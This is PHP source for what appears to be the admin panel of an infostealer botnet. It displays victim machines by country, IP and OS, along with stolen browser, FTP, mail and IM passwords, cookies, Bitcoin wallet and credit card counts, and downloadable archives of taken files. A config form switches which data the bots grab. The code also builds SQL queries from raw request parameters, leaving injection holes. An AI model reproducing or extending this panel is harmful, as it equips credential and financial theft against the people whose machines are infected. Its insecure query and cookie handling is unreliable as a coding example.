<?php
	include "config.php";
	include "functions.php";
	
$HTML = "";
$PAGE ="";

function SQLToArray($query){
	include "config.php";
	$result = array();
	$link = mysql_connect($database_host, $database_user, $database_pass) or die('No connect: ' . mysql_error());
	mysql_select_db($database_name) or die('No database');
	mysql_set_charset( 'utf8' );
	$res = mysql_query($query) or die('Query error: ' . mysql_error());

	while($row = mysql_fetch_assoc($res)){  
		array_push($result, $row);		
	}

	return $result;	
};


	function SetConfig(){
			if (@$_POST['IS_G_PWDS']=="1") $IS_G_PWDS = "1"; else $IS_G_PWDS = "0";
			if (@$_POST['IS_G_DOUBLE']=="1") $IS_G_DOUBLE = "1"; else $IS_G_DOUBLE = "0";
			if (@$_POST['IS_G_BROWSERS']=="1") $IS_G_BROWSERS = "1"; else $IS_G_BROWSERS = "0";
			if (@$_POST['IS_G_COINS']=="1") $IS_G_COINS = "1"; else $IS_G_COINS = "0";
			if (@$_POST['IS_G_SKYPE']=="1") $IS_G_SKYPE = "1"; else $IS_G_SKYPE = "0";
			if (@$_POST['IS_G_STEAM']=="1") $IS_G_STEAM = "1"; else $IS_G_STEAM = "0";
			if (@$_POST['IS_G_DESKTOP']=="1") $IS_G_DESKTOP = "1"; else $IS_G_DESKTOP = "0";
			if (isset($_POST['G_DESKTOP_EXTS'])) $G_DESKTOP_EXTS = $_POST['G_DESKTOP_EXTS']; else $G_DESKTOP_EXTS = "||";
			if (isset($_POST['G_DESKTOP_MAXSIZE'])) $G_DESKTOP_MAXSIZE = $_POST['G_DESKTOP_MAXSIZE']; else $G_DESKTOP_EXTS = "0";
			if (isset($_POST['DAE'])) $DAE = $_POST['DAE']; else $DAE = "";
			
			
			$res="";
			$res .="IS_G_PWDS: $IS_G_PWDS\r\n";
			$res .="IS_G_DOUBLE: $IS_G_DOUBLE\r\n";
			$res .="IS_G_BROWSERS: $IS_G_BROWSERS\r\n";
			$res .="IS_G_COINS: $IS_G_COINS\r\n";
			$res .="IS_G_SKYPE: $IS_G_SKYPE\r\n";
			$res .="IS_G_STEAM: $IS_G_STEAM\r\n";
			$res .="IS_G_DESKTOP: $IS_G_DESKTOP\r\n";
			$res .="G_DESKTOP_EXTS: $G_DESKTOP_EXTS\r\n";
			$res .="G_DESKTOP_MAXSIZE: $G_DESKTOP_MAXSIZE\r\n";
			$res .="DAE: $DAE\r\n";
			
			WriteToFile('cfg.txt', $res);			
			
	};

function ExecSQL($query){
	include "config.php";

	$link = mysql_connect($database_host, $database_user, $database_pass) or die('No connect: ' . mysql_error());
	mysql_select_db($database_name) or die('No database');
	mysql_set_charset( 'utf8' );
	$res = mysql_query($query) or die('Query error: ' . mysql_error());
	mysql_close($link);
};
	
function LoadPageSkeleton(){
	global $HTML;
	$HTML = FileToString("./html/fullpage.html");	
};

function ShowMenu(){
	global $HTML;
	global $PAGE;
	$menu = FileToString('./html/menu.html');
	if($PAGE == "home") 		$menu=str_replace("%1%", "class='active has-sub'", $menu);
	if($PAGE == "reports") 		$menu=str_replace("%2%", "class='active has-sub'", $menu);
	if($PAGE == "passwords") 	$menu=str_replace("%3%", "class='active has-sub'", $menu);
	if($PAGE == "cookiesconverter") 	$menu=str_replace("%4%", "class='active has-sub'", $menu);
	$HTML = str_replace("%MENU%",$menu, $HTML);
};
	
function ShowHomePage(){
	global $HTML;
	$page=FileToString('./html/home.html');
	$tables='';
	$div="<div style='display: inline-block; vertical-align: top; padding: 5px'>";
	
	$tables .=$div."Reports Count".build_table(SQLToArray(" SELECT COUNT(*), 
																	(SELECT COUNT(*) FROM reports WHERE reports.date=CURDATE()) as X
															FROM reports "),  
								array('All', 'Today'), 
								"config-table",
								array(' ', ' '),
								'reportsgrid'
								)."</div>";
	$tables .=$div."Country stats".build_table(SQLToArray("SELECT concat('<img src=img/flags/', LOWER(country), '.png>', country), COUNT(*) AS CountRec, 
										COUNT(*)/(SELECT COUNT(*) FROM reports)*100 AS percent
									  FROM reports
									  GROUP BY `country`
									  ORDER BY CountRec DESC"),  
								array('Loc', 'count', '%'), 
								"config-table",
								array(' ', ' ', ' '),
								'reportsgrid'
								)."</div>";
								
	$tables .=$div."Arch stats".build_table(SQLToArray(" SELECT `os_arch`, COUNT(*) AS CountRec, COUNT(*)/(SELECT COUNT(*) FROM reports)*100 AS percent
										  FROM reports
										  GROUP BY `os_arch`
										  ORDER BY CountRec DESC"),  
								array('Arch', 'count', '%'), 
								"config-table",
								array(' ', ' ', ' '),
								'reportsgrid'
								)."</div>";
								
	$tables .=$div."OS stats".build_table(SQLToArray(" SELECT `os_ver`, COUNT(*) AS CountRec, COUNT(*)/(SELECT COUNT(*) FROM reports)*100 AS percent
										  FROM reports
										  GROUP BY `os_ver`
										  ORDER BY CountRec DESC"),  
								array('OsVer', 'count', '%'), 
								"config-table",
								array(' ', ' ', ' '),
								'reportsgrid'
								)."</div>";
								
	$tables .=$div."Rights stats".build_table(SQLToArray(" SELECT `bin_rights`, COUNT(*) AS CountRec, COUNT(*)/(SELECT COUNT(*) FROM reports)*100 AS percent
										  FROM reports
										  GROUP BY `bin_rights`
										  ORDER BY CountRec DESC"),  
								array('Rights', 'count', '%'), 
								"config-table",
								array(' ', ' ', ' '),
								'reportsgrid'
								)."</div>";
	
		$tables .=$div."Binary type stats".build_table(SQLToArray("  SELECT `bin_type`, COUNT(*) AS CountRec, COUNT(*)/(SELECT COUNT(*) FROM reports)*100 AS percent
  FROM reports
  GROUP BY `bin_type`
  ORDER BY CountRec DESC"),  
								array('BinType', 'count', '%'), 
								"config-table",
								array(' ', ' ', ' '),
								'reportsgrid'
								)."</div>";
								
		$arr = SQLToArray("  SELECT `p_soft_type`, COUNT(*) AS CountRec, COUNT(*)/(SELECT COUNT(*) FROM passwords)*100 AS percent
				  FROM passwords
				  GROUP BY `p_soft_type`
				  ORDER BY CountRec DESC");
		for ($i=0; $i<sizeof($arr); $i++)
		{
			if($arr[$i]["p_soft_type"] ==  "1") $arr[$i]["p_soft_type"]="Browsers";
			if($arr[$i]["p_soft_type"] ==  "2") $arr[$i]["p_soft_type"]="FTP Clients";
			if($arr[$i]["p_soft_type"] ==  "3") $arr[$i]["p_soft_type"]="Mail Clients";
			if($arr[$i]["p_soft_type"] ==  "4") $arr[$i]["p_soft_type"]="IM Clients";
		};
		$tables .=$div."Passwords type stats".build_table($arr,  
								array('SoftType', 'count', '%'), 
								"config-table",
								array(' ', ' ', ' '),
								'reportsgrid'
								)."</div>";
								
		$tables .=$div."Software stats".build_table(SQLToArray(" SELECT concat('<img src=img/softs/', p_soft_name, '.png >', p_soft_name), COUNT(*) AS CountRec, COUNT(*)/(SELECT COUNT(*) FROM passwords)*100 AS percent
															  FROM passwords
															  GROUP BY `p_soft_name`
															  ORDER BY CountRec DESC"),  
								array('Soft', 'count', '%'), 
								"config-table",
								array(' ', ' ', ' '),
								'reportsgrid'
								)."</div>";							

	$page=str_replace("%STATS%", $tables, $page);
	
	
	
	$config = FileToString('./cfg.txt');
			if(pars($config, "IS_G_DOUBLE: ", "\r\n")=="1") 	$page = str_replace("%IS_G_DOUBLEchecked%", "checked", 	$page); else $page = str_replace("%IS_G_DOUBLEchecked%", "", 	$page);
			if(pars($config, "IS_G_PWDS: ", "\r\n")=="1") 		$page = str_replace("%IS_G_PWDSchecked%", "checked", 		$page); else $page = str_replace("%IS_G_PWDSchecked%", "", 		$page);
			if(pars($config, "IS_G_BROWSERS: ", "\r\n")=="1") 	$page = str_replace("%IS_G_BROWSERSchecked%", "checked", 	$page); else $page = str_replace("%IS_G_BROWSERSchecked%", "", 	$page);
			if(pars($config, "IS_G_COINS: ", "\r\n")=="1") 	$page = str_replace("%IS_G_COINSchecked%", "checked", 	$page); else $page = str_replace("%IS_G_COINSchecked%", "", 	$page);
			if(pars($config, "IS_G_SKYPE: ", "\r\n")=="1") 	$page = str_replace("%IS_G_SKYPEchecked%", "checked", 	$page); else $page = str_replace("%IS_G_SKYPEchecked%", "", 	$page);
			if(pars($config, "IS_G_STEAM: ", "\r\n")=="1") 	$page = str_replace("%IS_G_STEAMchecked%", "checked", 	$page); else $page = str_replace("%IS_G_STEAMchecked%", "", 	$page);
			if(pars($config, "IS_G_DESKTOP: ", "\r\n")=="1") 	$page = str_replace("%IS_G_DESKTOPchecked%", "checked", 	$page); else $page = str_replace("%IS_G_DESKTOPchecked%", "", 	$page);
			if(pars($config, "G_DESKTOP_EXTS: ", "\r\n")=="1") 	$page = str_replace("%IS_G_DESKTOPchecked%", "checked", 	$page); else $page = str_replace("%IS_G_DESKTOPchecked%", "", 	$page);
			$page = str_replace("%G_DESKTOP_EXTS%", pars($config, "G_DESKTOP_EXTS: ", "\r\n"),	$page);
			$page = str_replace("%G_DESKTOP_MAXSIZE%", pars($config, "G_DESKTOP_MAXSIZE: ", "\r\n"),	$page);
			$page = str_replace("%DAE%", pars($config, "DAE: ", "\r\n"),	$page);
	$HTML = str_replace("%PADE_DATA%", $page, $HTML);

};

function ShowReportsPage(){
	global $HTML;
	$query="SELECT  concat(reports.date, ' ',reports.time),
					concat(reports.country, ' ',reports.ip) AS country_ip,	
					concat(reports.compname, '(',reports.username,')') AS comp_user,
					concat(reports.os_ver, '||',reports.os_name, '(',os_arch,')') AS windows,
					reports.m_id AS m_id,
					reports.r_id,
					reports.comment,
					concat(reports.passwords_count, ' | ', reports.btc_count,' | ',reports.cc_count,' | ',reports.files_count),
					concat(reports.bin_type, '|', reports.bin_rights) AS bin,
					concat(reports.filename) AS filename
			FROM reports ";
	if(isset($_GET['cookiesearch'])) if(($_GET['cookiesearch'])!='')$query.=" JOIN cookies ON reports.r_id = cookies.r_id ";
	$query.=" WHERE 1=1 ";
	if(isset($_GET['datefrom'])) if(($_GET['datefrom'])!='') 	$query .= " AND reports.date>='".$_GET['datefrom']."'"; 
	if(isset($_GET['dateup'])) if(($_GET['dateup'])!='') 		$query .= " AND reports.date<='".$_GET['dateup']."'";
	if(isset($_GET['search']))	if(strlen($_GET['search'])>0)		$query .= " AND LOCATE('".$_GET['search']."', concat_ws('|', reports.country, reports.ip, reports.compname,reports.username,reports.os_name,reports.comment))";
	
	if(isset($_GET['countries']))	
		if(strlen($_GET['countries'])>0)	
			$query .= " AND LOCATE(reports.country, '".$_GET['countries']."' ) ";
	
	if(isset($_GET['cookiesearch'])) if(($_GET['cookiesearch'])!='') 
		//$query .= " AND (LOCATE('".$_GET['cookiesearch']."', cookies.domain) AND reports.r_id = cookies.r_id) ";
		$query .=" AND LOCATE('".$_GET['cookiesearch']."', cookies.domain)";
	if(isset($_GET['inc_btc'])) if ($_GET['inc_btc']=="1") $query .=" AND reports.btc_count>0";
	if(isset($_GET['inc_cc']))  if ($_GET['inc_cc']=="1") $query .=" AND reports.cc_count>0";
	if(!isset($_GET['status']))  $query .=" AND reports.trashed=0";
	if(isset($_GET['status']))  if ($_GET['status']=="0") $query .=" AND reports.trashed=0";
	if(isset($_GET['status']))  if ($_GET['status']=="1") $query .=" AND reports.trashed=1";
	
	$query .=" GROUP BY reports.r_id";
	$query .=" ORDER BY concat(reports.date, ' ',reports.time) DESC";
	//$query .=" LIMIT 28,5";
	//die($query);
	$report = SQLToArray($query);
	$report=array_values($report);/*<button id=',reports.r_id ,' onclick=%js_func%>Delete</button>*/

	
	for($i=0; $i<count($report); $i++){
		$actionscode="	<a href='?page=passwords&r_id=%s&soft_type1=1&soft_type2=1&soft_type3=1&soft_type4=1'><button>Open</button></a>
						<a href='files/%s' download><button style='width: 100px;  text-align: left;'>DL %s</button></a>
						<button onclick='%s'>Del</button>";
		$actionscode=sprintf($actionscode,
							$report[$i]["r_id"],
							$report[$i]["filename"],
							human_filesize(@filesize("./files/".$report[$i]["filename"]), 1),
							'deleteRow(this); sendPost("action=DeleteReport&r_id='.$report[$i]["r_id"].'"); '
							);
		$report[$i]["filename"]=$actionscode;
		$country_ip=explode(' ', strtolower($report[$i]["country_ip"]));
		$report[$i]["country_ip"]="<img src='img/flags/$country_ip[0].png'>".strtoupper($country_ip[0])." | $country_ip[1]";
		
		$report[$i]["windows"] = htmlspecialchars($report[$i]['windows'], ENT_QUOTES);
		$windows=explode('||', $report[$i]["windows"]);
		$report[$i]["windows"]="<img src='img/win/$windows[0].png' onerror='this.src='''> ".$windows[1];
		
		$report[$i]["bin"] = htmlspecialchars($report[$i]['bin'], ENT_QUOTES);
		$report[$i]["bin"].='&nbsp';
		$report[$i]["comment"]=sprintf("<input style='width: %s', type='text' value='%s' onkeydown='%s'",
								"100%",
								htmlspecialchars($report[$i]['comment'], ENT_QUOTES),
								//htmlentities($report[$i]['comment']),
								"if(event.keyCode==13){sendPost(".'"action=AddReportComment&r_id='.$report[$i]["r_id"].'&comment="+encodeURIComponent(this.value)'.")}"
								);
								
								
		$report[$i]["comp_user"] = htmlspecialchars($report[$i]['comp_user'], ENT_QUOTES);
		$report[$i]["m_id"] = htmlspecialchars($report[$i]['m_id'], ENT_QUOTES);
		

	};
	$reportstable=build_table($report,  //<abbr title="Common Gateway Interface, общий шлюзовый интерфейс">CGI</abbr>
								array('Date time ', 'Country|IP', 'Comp(user)', 'Windows', 'MachineID', '#','<abbr title="Press enter to save">Comment</abbr>', 'pwd|btc|cc|files', '<abbr title="T - binary type: exe(E)/dll(D)    R - rights user: (U)/admin(A)guest(G),system(S); ">T|R</abbr>', 'Actions'), 
								"reports-table",
								array(' ', ' ', ' ', ' ', ' ', ' ',' ', ' style="width: 20%"',' style="width: 7%"', ' align="right" width="1%" nowrap',' align="right" width="1%" nowrap'),
								'reportsgrid'
								);
								
	$templ = FileToString('./html/reports.html');
	$templ = str_replace("%count%", 
				count($report),
				$templ);

	$HTML = str_replace("%PADE_DATA%", 
			$templ.$reportstable,
			$HTML);
	
};

function ShowPasswordsPage(){
	$query="SELECT  passwords.p_soft_name,
					passwords.p_p1,	
					passwords.p_p2,
					passwords.p_p3,
					passwords.r_id
			FROM passwords, reports
			WHERE reports.r_id=passwords.r_id AND passwords.p_soft_name<>''
			";
	if(isset($_GET['search']))	if(strlen($_GET['search'])>0)		$query .= " AND LOCATE('".$_GET['search']."', concat_ws('|', passwords.p_soft_name, passwords.p_p1, passwords.p_p2,passwords.p_p3,passwords.r_id))";
	if(isset($_GET['datefrom'])) if(($_GET['datefrom'])!='') 	$query .= " AND reports.date>='".$_GET['datefrom']."'"; 
	
	if(isset($_GET['dateup'])) if(($_GET['dateup'])!='') 		$query .= " AND reports.date<='".$_GET['dateup']."'";
	if(isset($_GET['soft_type1']))  {if ($_GET['soft_type1']=="1") $query .=" ";} else $query .=" AND passwords.p_soft_type<>1";
	if(isset($_GET['soft_type2']))  {if ($_GET['soft_type2']=="1") $query .=" ";} else $query .=" AND passwords.p_soft_type<>2";
	if(isset($_GET['soft_type3']))  {if ($_GET['soft_type3']=="1") $query .=" ";} else $query .=" AND passwords.p_soft_type<>3";
	if(isset($_GET['soft_type4']))  {if ($_GET['soft_type4']=="1") $query .=" ";} else $query .=" AND passwords.p_soft_type<>4";
	if(isset($_GET['r_id']))  {if (($_GET['r_id']<>"") and (is_numeric($_GET['r_id']))) $query .=" AND passwords.r_id=".$_GET['r_id'];};
	//echo $query;
	$query .=" ORDER BY passwords.p_soft_type, passwords.p_soft_name";
	$report = SQLToArray($query);
	
	
	
	$machine="";
	if(isset($_GET['r_id']))  {if (($_GET['r_id']<>"") and (is_numeric($_GET['r_id']))) 
		$machineA = SQLToArray("SELECT  concat(reports.date, ' ',reports.time),
					concat(reports.country, ' ',reports.ip) AS country_ip,	
					concat(reports.compname, '(',reports.username,')') AS comp_user,
					concat(reports.os_ver, '||',reports.os_name, '(',os_arch,')') AS windows,
					reports.m_id AS m_id,
					reports.r_id,
					reports.comment,
					concat(reports.passwords_count, ' | ', reports.btc_count,' | ',reports.cc_count,' | ',reports.files_count),
					concat(reports.bin_type, '|', reports.bin_rights) AS bin,
					concat(reports.filename)
			FROM reports
			WHERE reports.r_id=".$_GET['r_id']." GROUP BY reports.r_id");
		if (sizeof(@$machineA)==1){
			$i=0;
			$filename = $machineA[$i]["concat(reports.filename)"];			
			$actionscode="	<a href='?page=passwords&r_id=%s&soft_type1=1&soft_type2=1&soft_type3=1&soft_type4=1'><button>Open</button></a>
							<a href='files/$filename' download><button style='width: 100px;  text-align: left;'>DL %s</button></a>
							<button onclick='%s'>Del</button>";
			$actionscode=sprintf($actionscode,
								$machineA[$i]["r_id"],
								human_filesize(@filesize("./files/$filename"), 1),
								'deleteRow(this); sendPost("action=DeleteReport&r_id='.$machineA[$i]["r_id"].'")'
								);
			
			$machineA[$i]["concat(reports.filename)"]=$actionscode;
			$country_ip=explode(' ', strtolower($machineA[$i]["country_ip"]));
			$machineA[$i]["country_ip"]="<img src='img/flags/$country_ip[0].png'>".strtoupper($country_ip[0])." | $country_ip[1]";
			$machineA[$i]["windows"] = htmlspecialchars($machineA[$i]['windows'], ENT_QUOTES);
			$windows=explode('||', $machineA[$i]["windows"]);
			$machineA[$i]["windows"]="<img src='img/win/$windows[0].png'> ".$windows[1];
			$machineA[$i]["bin"] = htmlspecialchars($machineA[$i]['bin'], ENT_QUOTES);
			$machineA[$i]["bin"].='&nbsp';
			$machineA[$i]["comment"]=sprintf("<input style='width: %s', type='text' value='%s' onkeydown='%s'",
									"100%",
									htmlspecialchars($machineA[$i]['comment'], ENT_QUOTES),
									//htmlentities($report[$i]['comment']),
									"if(event.keyCode==13){sendPost(".'"action=AddReportComment&r_id='.$machineA[$i]["r_id"].'&comment="+encodeURIComponent(this.value)'.")}"
									);	
			$machineA[$i]["comp_user"] = htmlspecialchars($machineA[$i]['comp_user'], ENT_QUOTES);
			$machineA[$i]["m_id"] = htmlspecialchars($machineA[$i]['m_id'], ENT_QUOTES);				
			$machine= build_table($machineA,  
									array('Date time ', 'Country|IP', 'Comp(user)', 'Windows', 'MachineID', '#','<abbr title="Press enter to save">Comment</abbr>', 'pwd|btc|cc|files', '<abbr title="T - binary type: exe(E)/dll(D)    R - rights user: (U)/admin(A)guest(G),system(S); ">T|R</abbr>', 'Actions'), 
									"reports-table",
									array(' ', ' ', ' ', ' ', ' ', ' ',' ', ' style="width: 20%"',' style="width: 7%"', ' align="right" width="1%" nowrap',' align="right" width="1%" nowrap'));
		}
	};
	
	for($i=0; $i<count($report); $i++){
		$report[$i]["p_soft_name"]=htmlspecialchars($report[$i]['p_soft_name'], ENT_QUOTES);
		$report[$i]["p_p1"]=htmlspecialchars($report[$i]['p_p1'], ENT_QUOTES);
		$report[$i]["p_p2"]=htmlspecialchars($report[$i]['p_p2'], ENT_QUOTES);
		$report[$i]["p_p3"]=htmlspecialchars($report[$i]['p_p3'], ENT_QUOTES);

		
		$report[$i]["p_soft_name"]="<img src='img/softs/".$report[$i]['p_soft_name'].".png'>".$report[$i]['p_soft_name'];
		
		$r_id=$report[$i]["r_id"];
		$report[$i]["r_id"]="<a href='?page=passwords&r_id=$r_id&soft_type1=1&soft_type2=1&soft_type3=1&soft_type4=1'><button>$r_id</button></a>";
	};
	
	
	
	$reportstable=build_table($report,  
								array('Soft name', 'URL', 'Username', 'Password', 'ReportID'), 
								"reports-table",
								array(' ', ' ', ' ',  ' ',' ' ,' align="right" width="1%" nowrap '));
	global $HTML;
	$templ = str_replace("%count%", 
				count($report),
				FileToString('./html/passwords.html'));
	$HTML = str_replace("%PADE_DATA%", $templ.$machine.$reportstable, $HTML);
};




function ShowConverterPage(){
	
	global $HTML;

	$HTML = str_replace("%PADE_DATA%", FileToString('./html/cookiesconverter.html'), $HTML);
};
	
function ProcessAction(){
		include "config.php";
	$result = array();
	$link = mysql_connect($database_host, $database_user, $database_pass) or die('No connect: ' . mysql_error());
	if($_POST['action']=="AddReportComment"){
		$query=sprintf("UPDATE reports
				SET reports.comment='%s'
				WHERE reports.r_id=%s",
				mysql_real_escape_string($_POST['comment']),
				mysql_real_escape_string($_POST['r_id']));
		
			ExecSQL($query);
	}	
	
		if($_POST['action']=="DeleteReport"){
		$query=sprintf("UPDATE reports
				SET reports.trashed='1'
				WHERE reports.r_id=%s",
				mysql_real_escape_string($_POST['r_id']));
		
			ExecSQL($query);
	}
	if($_POST['action']=="SetConfig") {
			SetConfig();
			header("Location: ".$_SERVER["REQUEST_URI"]);
	}
	
	if($_POST['action']=="EmptyTrash") {
		$filenames = SQLToArray("SELECT reports.filename FROM reports WHERE reports.trashed = 1");
		ExecSQL("DELETE FROM passwords
					WHERE passwords.r_id IN (SELECT reports.r_id FROM reports WHERE reports.trashed = 1)");
		ExecSQL("DELETE FROM cookies
					WHERE cookies.r_id IN (SELECT reports.r_id FROM reports WHERE reports.trashed = 1)");
				
		ExecSQL("DELETE FROM reports
					WHERE reports.trashed = 1");

		foreach ($filenames as $filename){
			
			@unlink("./files/".$filename['filename']);
		}
		header("Location: ".$_SERVER["REQUEST_URI"]);
	}
	
		if($_POST['action']=="DeleteAll") {
			ExecSql("TRUNCATE TABLE passwords");
			ExecSql("TRUNCATE TABLE reports");
			ExecSql("TRUNCATE TABLE cookies");
			
			if (file_exists('./files'))
				foreach (glob('./files/*') as $file)
					unlink($file);
			header("Location: ".$_SERVER["REQUEST_URI"]);
	}
};
	
function Main(){
	if (isset($_POST['action'])) {
			ProcessAction();
			die();
		}; 
	global $PAGE;
	global $HTML;
	if(isset($_GET['page'])){
		$PAGE=$_GET['page'];
	}else{
		$PAGE="home";
	};
	
	LoadPageSkeleton();
	ShowMenu();
	if($PAGE == "home") 		ShowHomePage();
	if($PAGE == "reports") 		ShowReportsPage();
	if($PAGE == "passwords") 	ShowPasswordsPage();
	if($PAGE == "cookiesconverter") 	ShowConverterPage();
	if($PAGE == "logout")		{
		setcookie("pwd", "");
		header("Location: ". $_SERVER['PHP_SELF']);
	}
	echo $HTML;
};

function Auth(){
		include "config.php";
		if (@$_POST['auth']=="1")
		if (@$_POST['password']==$admin_pwd)
		{
			//setcookie("pwd", md5($_POST['password'])); //setcookie("pwd", md5($_POST['password']), time() + 60 * 60 * 24 * 30);
			header('Set-cookie: pwd='.md5($_POST['password']));
			header("Location: ".$_SERVER['PHP_SELF']);
		};
};
	WriteToFile("./files/index.html", "");
	Auth();
	if((@$_COOKIE["pwd"]) != md5($admin_pwd)) die(FileToString('./html/login.html'));
	Main();	
?>